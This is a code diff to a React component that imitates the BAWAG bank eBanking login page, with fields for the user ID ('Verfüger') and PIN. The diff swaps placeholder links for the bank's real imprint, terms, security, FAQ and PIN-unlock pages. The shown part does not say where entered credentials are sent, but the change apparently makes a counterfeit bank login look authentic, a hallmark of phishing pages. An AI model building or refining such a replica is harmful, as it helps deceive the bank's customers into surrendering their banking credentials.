@@ -59,6 +59,14 @@ const translations: Record<Lang, {
 
 const BASE_WIDTH = 970;
 
+const footerUrls = [
+  "https://www.bawag.at/bawag/impressum",
+  "https://www.bawag.at/bawag/privatkunden/rechtliches/agb",
+  "https://www.bawag.at/bawag/datenschutz",
+  "https://www.bawag.at/bawag/privatkunden/rechtliches/nutzungsbedingungen",
+  "https://www.bawag.at/bawag/barrierefreiheit",
+];
+
 const Bawag = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
@@ -194,7 +202,7 @@ const Bawag = () => {
                 </div>
 
                 <div className="mt-auto pt-3">
-                  <a href="#" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
+                  <a href="https://services.bawag.at/main?formName=unlock-ebanking" target="_blank" rel="noopener noreferrer" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
                     <ChevronRight className="h-4 w-4" />
                     {t.forgotPin}
                   </a>
@@ -212,7 +220,7 @@ const Bawag = () => {
                   <p className="text-xs text-gray-600 leading-relaxed">
                     Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                   </p>
-                  <a href="#" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
+                  <a href="https://www.bawag.at/bawag/sicherheit#aktuell" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
                     <ChevronRight className="h-4 w-4" />
                     Mehr Infos
                   </a>
@@ -221,17 +229,17 @@ const Bawag = () => {
                 <div className="p-3">
                   <h2 className="font-bold text-sm mb-2 text-[#990000]">Service & Info</h2>
                   <ul className="space-y-1">
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
+                    <li><a href="https://www.bawag.at/bawag/sicherheit#regeln" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
+                    <li><a href="https://www.bawag.at/bawag/privatkunden/ebanking-apps/onlinebanking/erste-schritte-ebanking-app" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
+                    <li><a href="https://www.bawag.at/bawag/privatkunden/services-infos/3dsecure" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
                   </ul>
                 </div>
 
                 <div className="p-3">
                   <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                   <ul className="space-y-1">
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
+                    <li><a href="https://www.bawag.at/bawag/faq#ebanking" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
+                    <li><a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                   </ul>
                 </div>
               </div>
@@ -242,8 +250,8 @@ const Bawag = () => {
         {/* Footer */}
         <footer className="bg-white border-t border-gray-200 py-3 px-4">
           <div className="flex flex-wrap gap-3 justify-center mb-1">
-            {t.footer.map((item) => (
-              <a key={item} href="#" className="text-[10px] text-black underline hover:no-underline">
+            {t.footer.map((item, index) => (
+              <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-[10px] text-black underline hover:text-[#990000] transition-colors">
                 {item}
               </a>
             ))}
